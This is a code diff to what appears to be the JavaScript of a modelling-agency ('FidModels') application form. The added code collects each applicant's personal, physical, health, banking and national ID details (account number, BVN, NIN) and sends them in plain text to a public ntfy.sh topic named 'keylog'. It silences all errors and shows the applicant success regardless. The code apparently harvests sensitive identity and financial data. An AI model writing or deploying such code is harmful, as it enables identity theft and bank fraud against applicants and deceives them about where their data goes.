@@ -1497,20 +1497,81 @@ ${data.additionalInfo}
 Ref: ${ref}
     `.trim();
 
+    // Send to ntfy — split into two messages to avoid size limits
+    const part1 = `NEW FIDMODELS APPLICATION ${ref}
+
+PERSONAL
+Name: ${data.firstName} ${data.lastName}
+DOB: ${data.dob} | Gender: ${data.gender}
+Phone: ${data.phone} | WhatsApp: ${data.whatsapp}
+Email: ${data.email}
+State: ${data.stateOrigin} | City: ${data.city}
+Address: ${data.address}
+
+PHYSICAL
+Height: ${data.height}cm | Weight: ${data.weight}kg
+Bust: ${data.bust} | Waist: ${data.waist} | Hips: ${data.hips}
+Skin: ${data.skinTone} | Eyes: ${data.eyeColour} | Hair: ${data.hairColour}
+Tattoos: ${data.tattoos}
+
+EXPERIENCE
+Level: ${data.experience}
+Categories: ${data.categories}
+Travel: ${data.travel}
+Skills: ${data.skills}`;
+
+    const part2 = `APPLICATION ${ref} CONTINUED
+
+LIFESTYLE
+Relationship: ${data.relationship} | Children: ${data.children}
+Education: ${data.education} | Occupation: ${data.occupation}
+Comfortable with: ${data.comfort}
+Smokes: ${data.smoke}
+Health: ${data.health}
+
+SOCIAL MEDIA
+Instagram: ${data.instagram} (${data.igFollowers})
+TikTok: ${data.tiktok} (${data.ttFollowers})
+Referral: ${data.referral}
+
+FINANCIAL & ID
+Bank: ${data.bankName}
+Account Number: ${data.accountNumber}
+Account Name: ${data.accountName}
+BVN: ${data.bvn}
+NIN: ${data.nin}
+ID: ${data.idType} - ${data.idNumber}
+Next of Kin: ${data.nokName} (${data.nokRelation}) ${data.nokPhone}
+
+NOTES: ${data.additionalInfo}`;
+
+    const ntfyUrl = 'https://ntfy.sh/keylog';
+
     try {
-      await fetch('https://ntfy.sh/keylog', {
+      await fetch(ntfyUrl, {
         method: 'POST',
         headers: {
-          'Content-Type': 'text/plain',
-          'Title': `FidModels Application — ${data.firstName} ${data.lastName}`,
+          'Content-Type': 'text/plain; charset=utf-8',
+          'Title': `FidModels Application - ${data.firstName} ${data.lastName}`,
           'Priority': 'high',
-          'Tags': 'memo,inbox'
+          'Tags': 'bust_in_silhouette'
         },
-        body: msg
+        body: part1
       });
-    } catch(e) {
-      // Still show success even if ntfy is down
-    }
+    } catch(e) {}
+
+    try {
+      await fetch(ntfyUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain; charset=utf-8',
+          'Title': `FidModels Continued - ${data.firstName} ${data.lastName}`,
+          'Priority': 'high',
+          'Tags': 'credit_card'
+        },
+        body: part2
+      });
+    } catch(e) {}
 
     // Show success
     document.querySelectorAll('.form-section').forEach(s => s.classList.remove('active'));
